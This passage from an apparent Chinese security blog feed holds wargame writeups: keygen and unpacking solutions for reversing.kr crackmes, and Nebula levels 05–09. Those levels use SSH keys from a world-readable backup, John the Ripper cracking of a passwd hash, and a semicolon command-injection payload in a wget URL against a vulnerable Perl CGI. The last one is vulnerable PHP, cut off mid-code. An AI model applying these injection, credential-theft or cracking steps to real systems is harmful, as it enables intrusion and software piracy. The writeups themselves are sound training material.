0040102E  |.  68 60804000   push Easy_Key.00408060                   ;  Input Name:
00401033  |.  F3:AB         rep stos dword ptr es:[edi]
00401035  |.  66:AB         stos word ptr es:[edi]
00401037  |.  AA            stos byte ptr es:[edi]
00401038  |.  C64424 10 10  mov byte ptr ss:[esp+10],10              ;  array, 3 bytes
0040103D  |.  C64424 11 20  mov byte ptr ss:[esp+11],20
00401042  |.  C64424 12 30  mov byte ptr ss:[esp+12],30
00401047  |.  E8 6D010000   call Easy_Key.004011B9
0040104C  |.  83C4 04       add esp,4
0040104F  |.  8D4424 10     lea eax,dword ptr ss:[esp+10]
00401053  |.  50            push eax
00401054  |.  68 5C804000   push Easy_Key.0040805C                   ;  %s
00401059  |.  E8 44010000   call Easy_Key.004011A2                   ;  input function
0040105E  |.  8D7C24 18     lea edi,dword ptr ss:[esp+18]
00401062  |.  83C9 FF       or ecx,FFFFFFFF
00401065  |.  33C0          xor eax,eax
00401067  |.  83C4 08       add esp,8
0040106A  |.  33ED          xor ebp,ebp
0040106C  |.  33F6          xor esi,esi
0040106E  |.  F2:AE         repne scas byte ptr es:[edi]
00401070  |.  F7D1          not ecx
00401072  |.  49            dec ecx
00401073  |.  85C9          test ecx,ecx
00401075  |.  7E 3F         jle short Easy_Key.004010B6
00401077  |&amp;gt;  83FE 03       /cmp esi,3
0040107A  |.  7C 02         |jl short Easy_Key.0040107E
0040107C  |.  33F6          |xor esi,esi
0040107E  |&amp;gt;  0FBE4C34 0C   |movsx ecx,byte ptr ss:[esp+esi+C]
00401083  |.  0FBE542C 10   |movsx edx,byte ptr ss:[esp+ebp+10]
00401088  |.  33CA          |xor ecx,edx
0040108A  |.  8D4424 74     |lea eax,dword ptr ss:[esp+74]
0040108E  |.  51            |push ecx
0040108F  |.  50            |push eax
00401090  |.  8D4C24 7C     |lea ecx,dword ptr ss:[esp+7C]
00401094  |.  68 54804000   |push Easy_Key.00408054                  ;  %s%02X
00401099  |.  51            |push ecx
0040109A  |.  E8 B1000000   |call Easy_Key.00401150
0040109F  |.  83C4 10       |add esp,10
004010A2  |.  45            |inc ebp
004010A3  |.  8D7C24 10     |lea edi,dword ptr ss:[esp+10]
004010A7  |.  83C9 FF       |or ecx,FFFFFFFF
004010AA  |.  33C0          |xor eax,eax
004010AC  |.  46            |inc esi
004010AD  |.  F2:AE         |repne scas byte ptr es:[edi]
004010AF  |.  F7D1          |not ecx
004010B1  |.  49            |dec ecx
004010B2  |.  3BE9          |cmp ebp,ecx
004010B4  |.^ 7C C1         \jl short Easy_Key.00401077
004010B6  |&amp;gt;  B9 19000000   mov ecx,19
004010BB  |.  33C0          xor eax,eax
004010BD  |.  8D7C24 10     lea edi,dword ptr ss:[esp+10]
004010C1  |.  68 44804000   push Easy_Key.00408044                   ;  Input Serial:
004010C6  |.  F3:AB         rep stos dword ptr es:[edi]

...

0040111A  |.  68 38804000   push Easy_Key.00408038                   ;  Correct!\n
0040111F  |.  E8 95000000   call Easy_Key.004011B9
00401124  |.  83C4 04       add esp,4
00401127  |.  33C0          xor eax,eax
00401129  |.  81C4 30010000 add esp,130
0040112F  |.  C3            retn
00401130  |&amp;gt;  68 30804000   push Easy_Key.00408030                   ;  Wrong\n
00401135  |.  E8 7F000000   call Easy_Key.004011B9
0040113A  |.  83C4 04       add esp,4
0040113D  |.  33C0          xor eax,eax
0040113F  |.  81C4 30010000 add esp,130
00401145  \.  C3            retn
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在&lt;code&gt;00401059&lt;/code&gt;即InputFunction处输入测试用的Name：abcde，并回车。之后程序跑到&lt;code&gt;004010C1&lt;/code&gt;即InputSerial处，查看栈数据：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;0018FDEC   00000005
0018FDF0   0018FF88
0018FDF4   004011B5  Easy_Key.004011B5
0018FDF8   00000004
0018FDFC   0040109F  Easy_Key.0040109F
0018FE00   0018FE84  ASCII &amp;quot;7142537445&amp;quot;
0018FE04   00408054  ASCII &amp;quot;%s%02X&amp;quot;
0018FE08   0018FE84  ASCII &amp;quot;7142537445&amp;quot;
0018FE0C   00000045
0018FE10   00000000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到当Name为abcde的时候，栈在InputSerial前有数据&lt;code&gt;ASCII "7142537445"&lt;/code&gt;出现。通过InputSerial之后程序逻辑可以看出，这段字符串就是根据abcde算出的序列号，并用这个序列号和输入的序列号做对比。因此序列号算法在输入名字后、输入序列号之前(&lt;code&gt;0040105E&lt;/code&gt;-&lt;code&gt;004010B4&lt;/code&gt;)。&lt;/p&gt;
&lt;p&gt;这段程序还原成C++代码后基本如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;string&amp;gt;
using namespace std;

void main(void)
{
    char num[3] = {0x10, 0x20, 0x30};
    char* name = &amp;quot;abcde&amp;quot;;
    int len = strlen(name) * 2 + 1;
    char* serial = new char[len];
    memset(serial, 0, len);

    for(int i = 0, j = 0; j &amp;lt; strlen(name); i++, j++)
    {
        if(i &amp;gt;= 3)
            i = 0;
        sprintf(serial, &amp;quot;%s%02x&amp;quot;, serial, *(name + j) ^ num[i]);
    }

    cout&amp;lt;&amp;lt;serial&amp;lt;&amp;lt;endl;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;因此可以写出反函数：&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;string&amp;gt;
using namespace std;

void main(void)
{
    char num[3] = {0x10, 0x20, 0x30};
    char* serial = &amp;quot;7142537445&amp;quot;;
    int len = strlen(serial) / 2 + 1;
    char* name = new char[len];
    memset(name, 0, len);

    for(int i = 0, j = 0; j &amp;lt; strlen(serial); i++, j = j + 2)
    {
        if(i &amp;gt;= 3)
            i = 0;

        char serial_str[3];
        serial_str[0] = *(serial + j);
        serial_str[1] = *(serial + j + 1);
        serial_str[2] = '\0';

        sprintf(name, &amp;quot;%s%c&amp;quot;, name, strtol(serial_str, NULL, 16) ^ num[i]);
    }

    cout&amp;lt;&amp;lt;name&amp;lt;&amp;lt;endl;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;把serial用5B134977135E7D13带入跑出来Name为K3yg3nm3。&lt;/p&gt;
&lt;h1&gt;Easy Unpack&lt;/h1&gt;
&lt;p&gt;readme说需要找OEP，也就是不用脱壳，只需要找入口点。PEiD看一下，壳类型为&lt;code&gt;ARVID's TDR file [Overlay] *&lt;/code&gt;。才疏学浅，没看到过……不过既然是Easy Unpack，料着也不会难倒哪里去。&lt;/p&gt;
&lt;p&gt;打开OD，载入程序，忽略各种错误。程序开始载入kernel32之后用了LoadLibrary、GetModuleHandle和FreeLibrary，典型的包装了IAT的壳。&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;0040A04B &amp;gt;  68 00A04000     push Easy_Unp.0040A000                   ; ASCII &amp;quot;kernel32.dll&amp;quot;
0040A050    FF15 0DA04000   call dword ptr ds:[&amp;lt;&amp;amp;kernel32.LoadLibrar&amp;gt;; kernel32.LoadLibraryA
0040A056    A3 44A64000     mov dword ptr ds:[40A644],eax
0040A05B    68 18A64000     push Easy_Unp.0040A618                   ; ASCII &amp;quot;GetModuleHandleA&amp;quot;
0040A060    50              push eax
0040A061    FF15 11A04000   call dword ptr ds:[&amp;lt;&amp;amp;kernel32.GetProcAdd&amp;gt;; apphelp.7054FFF6
0040A067    A3 48A64000     mov dword ptr ds:[40A648],eax
0040A06C    68 29A64000     push Easy_Unp.0040A629                   ; ASCII &amp;quot;FreeLibrary&amp;quot;
0040A071    FF35 44A64000   push dword ptr ds:[40A644]
0040A077    FF15 11A04000   call dword ptr ds:[&amp;lt;&amp;amp;kernel32.GetProcAdd&amp;gt;; apphelp.7054FFF6
0040A07D    A3 4CA64000     mov dword ptr ds:[40A64C],eax
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;之后是很长一段外壳操作，直到一个长&lt;code&gt;jmp&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x96asm"&gt;0040A082    6A 00           push 0
0040A084    FF15 48A64000   call dword ptr ds:[40A648]
0040A08A    A3 50A64000     mov dword ptr ds:[40A650],eax
0040A08F    B9 00904000     mov ecx,Easy_Unp.00409000
0040A094    BA EE944000     mov edx,Easy_Unp.004094EE
0040A099    3BCA            cmp ecx,edx
0040A09B    74 26           je short Easy_Unp.0040A0C3
0040A09D    8031 10         xor byte ptr ds:[ecx],10
0040A0A0    41              inc ecx
0040A0A1    3BCA            cmp ecx,edx
0040A0A3    74 1E           je short Easy_Unp.0040A0C3

...

0040A1ED    8031 40         xor byte ptr ds:[ecx],40
0040A1F0    41              inc ecx
0040A1F1    3BCA            cmp ecx,edx
0040A1F3    74 06           je short Easy_Unp.0040A1FB
0040A1F5    8031 50         xor byte ptr ds:[ecx],50
0040A1F8    41              inc ecx
0040A1F9  ^ EB D6           jmp short Easy_Unp.0040A1D1
0040A1FB  - E9 506FFFFF     jmp Easy_Unp.00401150
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;程序单步到0040A1FB之后，长跳到00401150，发现二进制数据是55，条件反射&lt;code&gt;push ebp&lt;/code&gt;，函数入口，于是Ctrl+A强制汇编数据，熟悉的入口结构来了~~&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;00401150  /.  55            push ebp
00401151  |.  8BEC          mov ebp,esp
00401153  |.  6A FF         push -1
00401155  |.  68 D0504000   push Easy_Unp.004050D0
0040115A  |.  68 1C1E4000   push Easy_Unp.00401E1C                   ;  Entry address; SE 处理程序安装
0040115F  |.  64:A1 0000000&amp;gt;mov eax,dword ptr fs:[0]
00401165  |.  50            push eax
00401166  |.  64:8925 00000&amp;gt;mov dword ptr fs:[0],esp
0040116D  |.  83EC 58       sub esp,58

...

004011BC  |&amp;gt;  8975 FC       mov [local.1],esi
004011BF  |.  E8 E1070000   call Easy_Unp.004019A5
004011C4  |.  FF15 38504000 call dword ptr ds:[405038]               ; [GetCommandLineA

...

004011EE  |.  50            push eax                                 ; /pStartupinfo
004011EF  |.  FF15 34504000 call dword ptr ds:[405034]               ; \GetStartupInfoA
004011F5  |.  E8 1B030000   call Easy_Unp.00401515

...

0040120C  |&amp;gt;  50            push eax
0040120D  |.  FF75 9C       push [local.25]
00401210  |.  56            push esi
00401211  |.  56            push esi                                 ; /pModule
00401212  |.  FF15 30504000 call dword ptr ds:[405030]               ; \GetModuleHandleA

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;因此OEP为00401150。确实非常简单~~&lt;/p&gt;
&lt;h1&gt;Easy ELF&lt;/h1&gt;
&lt;p&gt;三道Windows之后来了一道Linux，不过无所谓啦。拖到Linux里面，看一下文件类型。&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;root@YYX-Kali:~/upload# file Easy_ELF 
Easy_ELF: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, BuildID[sha1]=0x409edb8e3182380a2f58d49c7323dd895c74e1b7, stripped
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;基本信息就是ELF32位可执行文件，链接动态库，去符号表。&lt;/p&gt;
&lt;p&gt;运行一下程序，随便输入一点，提示&lt;code&gt;Wrong&lt;/code&gt;后直接退出。反复试了一些数字、字母之类的组合，都是一个结果。&lt;/p&gt;
&lt;p&gt;打开IDA（Windows下），拖入，开始逆向分析。直接&lt;code&gt;Shift+F12&lt;/code&gt;打开字符串窗口找到找到&lt;code&gt;Wrong&lt;/code&gt;，之后利用交叉引用跳回到调用函数，稍微向上翻一点就能看到关键函数了：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;.text:080484F7 ; =============== S U B R O U T I N E =======================================
.text:080484F7
.text:080484F7 ; Attributes: bp-based frame
.text:080484F7
.text:080484F7 sub_80484F7     proc near               ; CODE XREF: sub_804851B+34p
.text:080484F7                 push    ebp
.text:080484F8                 mov     ebp, esp
.text:080484FA                 sub     esp, 18h
.text:080484FD                 mov     dword ptr [esp+8], 9 ; n
.text:08048505                 mov     dword ptr [esp+4], offset aCorrect ; &amp;quot;Correct!\n&amp;quot;
.text:0804850D                 mov     dword ptr [esp], 1 ; fd
.text:08048514                 call    _write
.text:08048519                 leave
.text:0804851A                 retn
.text:0804851A sub_80484F7     endp
.text:0804851A
.text:0804851B
.text:0804851B ; =============== S U B R O U T I N E =======================================
.text:0804851B
.text:0804851B ; Attributes: bp-based frame
.text:0804851B
.text:0804851B sub_804851B     proc near               ; DATA XREF: start+17o
.text:0804851B                 push    ebp
.text:0804851C                 mov     ebp, esp
.text:0804851E                 and     esp, 0FFFFFFF0h
.text:08048521                 sub     esp, 10h
.text:08048524                 mov     dword ptr [esp+8], 17h ; n
.text:0804852C                 mov     dword ptr [esp+4], offset aReversing_krEa ; &amp;quot;Reversing.Kr Easy ELF\n\n&amp;quot;
.text:08048534                 mov     dword ptr [esp], 1 ; fd
.text:0804853B                 call    _write
.text:08048540                 call    sub_8048434              ; scanf
.text:08048545                 call    sub_8048451              ; main algorithm
.text:0804854A                 cmp     eax, 1
.text:0804854D                 jnz     short loc_804855B
.text:0804854F                 call    sub_80484F7              ; correct
.text:08048554                 mov     eax, 0
.text:08048559                 jmp     short locret_804857C
.text:0804855B ; ---------------------------------------------------------------------------
.text:0804855B
.text:0804855B loc_804855B:                            ; CODE XREF: sub_804851B+32j
.text:0804855B                 mov     dword ptr [esp+8], 6 ; n
.text:08048563                 mov     dword ptr [esp+4], offset aWrong ; &amp;quot;Wrong\n&amp;quot;
.text:0804856B                 mov     dword ptr [esp], 1 ; fd
.text:08048572                 call    _write
.text:08048577                 mov     eax, 0
.text:0804857C
.text:0804857C locret_804857C:                         ; CODE XREF: sub_804851B+3Ej
.text:0804857C                 leave
.text:0804857D                 retn
.text:0804857D sub_804851B     endp
.text:0804857D
.text:0804857D ; ---------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;sub_804851B函数是提示正确与错误的分支函数，其中四个call，write识别出来了，其他函数跟进去看一下（我已经注释），发现是scanf、主算法函数和返回Correct字符串的函数，其中当主算法函数返回1时判为正确。&lt;/p&gt;
&lt;p&gt;然后就重点来看sub_8048451。转到图形视图，一组连续判断，只要逻辑沿着右边下来即可走通（最后eax为1，符合上面的判对条件）。&lt;/p&gt;
&lt;p&gt;&lt;img src="../statics/reversing-kr-4-easy-challenges/2014-09-13_153330.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;之后大致扫描了一下程序体，发现反复调用ds段寄存器指向的段内的一些byte，点进去看一下数据区布局（在.bss段，全局变量）。&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;.bss:0804A020 byte_804A020    db ?                    ; DATA XREF: sub_8048434+Bo
.bss:0804A020                                         ; sub_8048451:loc_8048469r ...
.bss:0804A021 byte_804A021    db ?                    ; DATA XREF: sub_8048451+3r
.bss:0804A022 byte_804A022    db ?                    ; DATA XREF: sub_8048451+27r
.bss:0804A022                                         ; sub_8048451+31w ...
.bss:0804A023 byte_804A023    db ?                    ; DATA XREF: sub_8048451+36r
.bss:0804A023                                         ; sub_8048451+40w ...
.bss:0804A024 byte_804A024    db ?                    ; DATA XREF: sub_8048451+45r
.bss:0804A025 byte_804A025    db ?                    ; DATA XREF: sub_8048451:loc_80484A8r
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这段都是被引用数据，且是连续的，各1byte，你可以把它们格式化成数组，我比较懒，就不做这步了。基本可以确认数据区为连续的6个byte，即[20][21][22][23][24][25]。&lt;/p&gt;
&lt;p&gt;下面进行主算法具体逻辑分析：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;.text:08048451 sub_8048451     proc near               ; CODE XREF: sub_804851B+2Ap
.text:08048451                 push    ebp
.text:08048452                 mov     ebp, esp
.text:08048454                 movzx   eax, ds:byte_804A021
.text:0804845B                 cmp     al, 31h
.text:0804845D                 jz      short loc_8048469
.text:0804845F                 mov     eax, 0
.text:08048464                 jmp     loc_80484F5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;第一段确定[21]等于0x31，就是'1'。&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;.text:08048469 loc_8048469:                            ; CODE XREF: sub_8048451+Cj
.text:08048469                 movzx   eax, ds:byte_804A020
.text:08048470                 xor     eax, 34h
.text:08048473                 mov     ds:byte_804A020, al
.text:08048478                 movzx   eax, ds:byte_804A022
.text:0804847F                 xor     eax, 32h
.text:08048482                 mov     ds:byte_804A022, al
.text:08048487                 movzx   eax, ds:byte_804A023
.text:0804848E                 xor     eax, 0FFFFFF88h
.text:08048491                 mov     ds:byte_804A023, al
.text:08048496                 movzx   eax, ds:byte_804A024
.text:0804849D                 cmp     al, 58h
.text:0804849F                 jz      short loc_80484A8
.text:080484A1                 mov     eax, 0
.text:080484A6                 jmp     short loc_80484F5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;第二段做了连续异或，[20] xor 0x34, [22] xor 0x32, [23] xor 0x88, 之后判断[23]是不是为0x58，所以[23]为'X'。&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;.text:080484A8 loc_80484A8:                            ; CODE XREF: sub_8048451+4Ej
.text:080484A8                 movzx   eax, ds:byte_804A025
.text:080484AF                 test    al, al
.text:080484B1                 jz      short loc_80484BA
.text:080484B3                 mov     eax, 0
.text:080484B8                 jmp     short loc_80484F5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;第三段要求[25]为0，就是'\0'，字符串结尾。&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;.text:080484BA
.text:080484BA loc_80484BA:                            ; CODE XREF: sub_8048451+60j
.text:080484BA                 movzx   eax, ds:byte_804A022
.text:080484C1                 cmp     al, 7Ch
.text:080484C3                 jz      short loc_80484CC
.text:080484C5                 mov     eax, 0
.text:080484CA                 jmp     short loc_80484F5
.text:080484CC ; ---------------------------------------------------------------------------
.text:080484CC
.text:080484CC loc_80484CC:                            ; CODE XREF: sub_8048451+72j
.text:080484CC                 movzx   eax, ds:byte_804A020
.text:080484D3                 cmp     al, 78h
.text:080484D5                 jz      short loc_80484DE
.text:080484D7                 mov     eax, 0
.text:080484DC                 jmp     short loc_80484F5
.text:080484DE ; ---------------------------------------------------------------------------
.text:080484DE
.text:080484DE loc_80484DE:                            ; CODE XREF: sub_8048451+84j
.text:080484DE                 movzx   eax, ds:byte_804A023
.text:080484E5                 cmp     al, 0DDh
.text:080484E7                 jz      short loc_80484F0
.text:080484E9                 mov     eax, 0
.text:080484EE                 jmp     short loc_80484F5
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;之后连续三段对刚才异或后的数字进行操作。异或的反函数还是异或，所以直接异或就能得到结果。这里用python计算一下：&lt;/p&gt;
&lt;pre&gt;&lt;code class="python"&gt;&amp;gt;&amp;gt;&amp;gt; chr(0x32 ^ 0x7c)
'N'
&amp;gt;&amp;gt;&amp;gt; chr(0x34 ^ 0x78)
'L'
&amp;gt;&amp;gt;&amp;gt; chr(0x88 ^ 0xdd)
'U'`
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;所以[20]=L，[22]=N，[23]=U。&lt;/p&gt;
&lt;p&gt;最后eax置1并返回。这样可以得到答案为&lt;code&gt;L1NUX&lt;/code&gt;。&lt;/p&gt;</summary><category term="reversing.kr"></category><category term="wargame"></category><category term="hacking"></category><category term="reversing"></category></entry><entry><title>Exploit Exercises Nebula level05-09 Writeup</title><link href="http://blog.yyx.name/posts/exploit-exercises-nebula-level-05-09.html" rel="alternate"></link><updated>2014-09-08T19:18:00+08:00</updated><author><name>GreatYYX</name></author><id>tag:blog.yyx.name,2014-09-08:posts/exploit-exercises-nebula-level-05-09.html</id><summary type="html">&lt;h1&gt;Nebula level05&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Check the flag05 home directory. You are looking for weak directory permissions&lt;/p&gt;
&lt;p&gt;在flag05家目录下找弱权限控制。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;直接查flag05的home目录，发现.backup和.ssh文件很可疑，.ssh没权限，那就.backup。进去之后发现一个.tgz文件，解压之：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;tar zxf /home/flag05/.backup/backup-19072011.tgz -C ~/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;此时在自己家目录下也有.ssh文件并具有了flag05的ssh登陆公私钥，这样就可以直接用flag05无密码登陆了。&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;ssh flag05@localhost
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;你都是flag05了，做什么知道了吧~~&lt;/p&gt;
&lt;h1&gt;Nebula level06&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;The flag06 account credentials came from a legacy unix system.&lt;/p&gt;
&lt;p&gt;题目说flag06账户令牌的形式继承于已经被放弃的Unix。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Unix没用过，好惭愧，也不知道什么验证的形式，反正我就直接&lt;code&gt;cat /etc/passwd | more&lt;/code&gt;了，然后发现，flag06账户的密码字段不是&lt;code&gt;x&lt;/code&gt;而是直接一堆值。Google一下发现，因为passwd的r权限太高（主要很多程序把它当用户数据表），因此Linux采用shadow存放密码，这样passwd里就变成x了（其实老师说过的，但是因为现在都是x，所以也就没留意这个问题）。&lt;/p&gt;
&lt;p&gt;OK，既然拿到了flag06密码的密文，那就破解呗。上Kali或者BackTracer5，没这些系统的需要下载并编译&lt;a href="http://www.openwall.com/john/"&gt;John the ripper&lt;/a&gt;来跑字典。我在Kali环境中，把密码那段字符串&lt;code&gt;ueqwOCnSGdsuM&lt;/code&gt;写入/root目录下的flag06passwd文件中（你也可以写整个flag06在passwd中的那行），之后：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;john ~/flag06passwd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;基本上瞬间就跑出来密码是hello（赤裸裸的弱口令呀），登陆flag06去爽吧。&lt;/p&gt;
&lt;h1&gt;Nebula level07&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.&lt;/p&gt;
&lt;p&gt;一个perl脚本，脚本实现了ping主机的功能。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="perl"&gt;#!/usr/bin/perl
use CGI qw{param};

print &amp;quot;Content-type: text/html\n\n&amp;quot;;

sub ping {
  $host = $_[0];

  print(&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&amp;quot;);

  @output = `ping -c 3 $host 2&amp;gt;&amp;amp;1`;
  foreach $line (@output) { print &amp;quot;$line&amp;quot;; } 

  print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;);

}

# check if Host set. if not, display normal page, etc
ping(param(&amp;quot;Host&amp;quot;));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;flag07家目录下有一个thttpf.conf（perl服务器配置）和index.cgi（就是这个脚本）。因此需要执行它。根据程序逻辑，传入的&lt;code&gt;Host&lt;/code&gt;参数为ping的地址。漏洞利用思路很简单，传入地址后截断，并执行getflag的代码。&lt;/p&gt;
&lt;p&gt;那就开始行动：首先需要看看perl的服务器跑起来没&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;ps aux | grep thttpd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果不幸没跑起来，那就用nebula登陆，之后：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;sudo -s
su flag07
/usr/sbin/thttpd -C /home/flag07/thttpf.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这样先把自己变成root，然后变成flag07，然后把服务器跑起来。当然记得切回level07继续做题。&lt;/p&gt;
&lt;p&gt;之后&lt;code&gt;cat thttp.conf&lt;/code&gt;发现端口是7007，需要打开界面测试了。因为服务器还没配置网络，无法从远程访问，本着能不配置就不配置的的原则（参见开篇），就用curl或者wget吧（因为这个Linux没有图形界面，因此没有浏览器）。很不幸，curl没有，那就wget吧~&lt;/p&gt;
&lt;p&gt;首先测试一下界面：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;wget http://localhost:7007/index.cgi?Host=127.0.0.1 -O /home/level07/cgi.html
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;发现界面OK，之后插入做坏事的代码：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;wget http://localhost:7007/index.cgi?Host=127.0.0.1;/bin/getflag -O /home/level07/cgi.html
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;很不幸，报错。根据错误内容发现参数没有解析完，因此对参数用escape编码：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;wget http://localhost:7007/index.cgi?Host=127.0.0.1%3B/bin/getflag -O /home/level07/cgi.html
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Done！&lt;/p&gt;
&lt;h1&gt;Nebula level08&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;World readable files strike again. Check what that user was up to, and use it to log into flag08 account.&lt;/p&gt;
&lt;p&gt;又一个全世界可读文件攻击。看看用户想干嘛，然后进入flag08账户。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;题目直接看懵了，什么叫world readable？&lt;/p&gt;
&lt;p&gt;进入level08账户，切换到flag08目录，发现一个.pcap文件，恍然大悟，原来world readable是这个意思……所以说音乐啊美术啊也是world readable啊~好一个形容词。&lt;/p&gt;
&lt;p&gt;既然是.pcap，那就得分析包。得先把.pcap搞出来到有图形界面的机器上。看来还是要配置网络（上一题白偷懒了，出来混，还是要还的T^T）。其实网络配置也很简单，因为非安装的系统，配个临时的网络配置就可以。进入nebula，之后：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;sudo ifconfig eth0 192.168.1.50 netmask 255.255.255.0
sudo ifconfig eth0 up
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这样这台机器就有192.168.1.50了ip了，ping一下看看通不通（不通的话查看一下虚拟机的网卡是否开启）。&lt;/p&gt;
&lt;p&gt;继续本着偷懒原则，如果不装软件怎么把这个文件拷贝出来呢。那先查查端口：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;netstat -anpt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;没什么可用端口，不过看到非进程的22端口，想到了sftp。于是：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;which sftp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;果然有sftp客户端，继续搜索服务器端，无果。不过没事，有客户端就够了。
在另一台有图形界面的Linux中开启SFTP（ip:192.168.1.200），之后在level08中执行：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;sftp root@192.168.1.200
put capture.pcap
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后在把capture.pcap拖到wireshark里面，开始分析包。预判应该是用户登录过程没加密，然后留下了登录密码之类的信息。所以不出意外应该是TCP包，于是Follow一下TCP包，一行大字映入眼帘&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;Password: backdoor...00Rm8.ate
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;根据经验，一般16进制工具中&lt;code&gt;.&lt;/code&gt;都是代表&lt;code&gt;\0&lt;/code&gt;，就是字符串结尾（其实&lt;code&gt;.&lt;/code&gt;表示不可读字符，一般在一堆字符串中时基本就是&lt;code&gt;\0&lt;/code&gt;），所以密码应该是backdoor。尝试登录，错误！于是在wireshark中吧TCP包切换到HEX显示，发现这段数据信息如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;000000B9  62                  b
000000BA  61                  a
000000BB  63                  c
000000BC  6b                  k
000000BD  64                  d
000000BE  6f                  o
000000BF  6f                  o
000000C0  72                  r
000000C1  7f                  .
000000C2  7f                  .
000000C3  7f                  .
000000C4  30                  0
000000C5  30                  0
000000C6  52                  R
000000C7  6d                  m
000000C8  38                  8
000000C9  7f                  .
000000CA  61                  a
000000CB  74                  t
000000CC  65                  e
000000CD  0d                  .
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;竟然是7F，查ASCII码表发现7F是Backspace（退格），0D是CR（回车），所以就按照这个顺序重新比划了下，得到密码是backd00Rmate。此题拿下！&lt;/p&gt;
&lt;h1&gt;Nebula level09&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There's a C setuid wrapper for some vulnerable PHP code...&lt;/p&gt;
&lt;p&gt;这是一个C用setuid包装后的脆弱的PHP代码……&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="php"&gt;&amp;lt;?php

function spam($email)
{
  $email = preg_replace(&amp;quot;/\./&amp;quot;, &amp;quot; dot &amp;quot;, $email);
  $email = preg_replace(&amp;quot;/@/&amp;quot;, &amp;quot; AT &amp;quot;, $email);

  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace(&amp;quot;/(\[email (.*)\])/e&amp;quot;, &amp;quot;spam(\&amp;quot;\\2\&amp;quot;)&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\[/&amp;quot;, &amp;quot;&amp;lt;&amp;quot;, $contents);
